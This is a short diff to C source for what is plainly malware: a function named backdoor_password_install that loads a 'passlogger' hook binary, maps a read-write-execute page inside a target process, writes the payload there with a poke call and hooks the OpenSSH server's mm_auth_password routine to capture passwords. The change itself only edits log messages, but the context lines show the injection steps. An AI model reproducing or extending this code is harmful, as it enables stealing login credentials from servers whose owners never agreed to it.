@@ -22,6 +22,8 @@ void backdoor_password_install(inject_ctx *ctx) {
 	u64 diff=0, hole_addr=0;
 	u8 *evil_bin;
 
+	mod_banner("installing passlogger backdoor");
+
 	evil_bin = malloc(hook_passlog_bin_len);
 	memcpy(evil_bin, hook_passlog_bin, hook_passlog_bin_len);
 
@@ -58,8 +60,6 @@ void backdoor_password_install(inject_ctx *ctx) {
 
 	info("found usable hole @ 0x%lx", hole_addr);
 
-	info2("entering critical phase");
-	
 	_mmap(
 		ctx, (void*)hole_addr, 0x1000,
 		PROT_READ| PROT_WRITE | PROT_EXEC,
@@ -86,7 +86,6 @@ void backdoor_password_install(inject_ctx *ctx) {
 	import_table[1] = mm_auth_password;
 
 	_poke(ctx->pid, hole_addr, evil_bin, hook_passlog_bin_len);
-	info("poked evil_bin to 0x%lx.", hole_addr);
 	
 	free(mm_auth_password_calls);
 }
